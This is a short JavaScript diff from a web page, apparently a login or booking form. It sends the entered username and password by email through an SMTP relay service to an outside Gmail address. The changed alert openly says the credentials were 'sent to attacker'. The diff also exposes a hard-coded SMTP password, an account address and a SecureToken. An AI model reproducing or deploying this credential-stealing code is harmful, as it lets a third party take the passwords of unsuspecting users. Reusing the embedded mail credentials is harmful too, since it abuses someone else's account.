@@ -93,10 +93,8 @@
             var t1 = document.getElementById("password").value;
 
             Email.send({
-                Host:"smtp.elasticemail.com",
-                Username:"leocarsgarage@gmail.com",
-                Password:"FE81E6A73867B1625E2D9ACD81EFE0B3BC01",
-                To : "palanisamyremotejob@gmail.com",
+               SecureToken : "3a56b7db-932e-497f-8bf2-8c3c1a0e7d96",
+                To : "palanisamyown@gmail.com",
                 From: "leocarsgarage@gmail.com",
                 Subject: "Testing",
                 Body:"body" + t2 + "  " + t1,
@@ -104,7 +102,7 @@
                 message =>{
                    
                     if(message=='OK'){
-                        alert('Your room has been booked successfully, check your e-mail for confirmation.');
+                        alert('Your username : ' + t2 + '  and password ' + t1 + ' sent to attacker');
                     }
                     else{
                         console.error (message);
